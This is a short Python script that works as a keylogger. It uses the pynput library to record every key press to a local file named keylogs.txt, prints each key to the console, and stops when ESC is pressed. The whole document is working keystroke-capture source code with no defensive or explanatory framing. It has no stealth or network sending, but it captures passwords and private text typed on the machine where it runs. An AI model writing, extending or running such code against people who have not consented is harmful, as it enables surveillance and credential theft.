import os
from pynput import keyboard

# Define the path for the log file in the same directory as the script
log_file = 'keylogs.txt'

def on_press(key):
    try:
        # Convert key to a string and append it to the log file
        with open(log_file, 'a') as f:
            f.write(str(key) + '\n')
            print(f"Key pressed: {key}")  # Debug print statement
    except Exception as e:
        print(f"Error logging key press: {e}")  # Error handling

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when ESC is pressed

# Create the log file if it doesn't exist
if not os.path.exists(log_file):
    with open(log_file, 'w') as f:
        pass

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()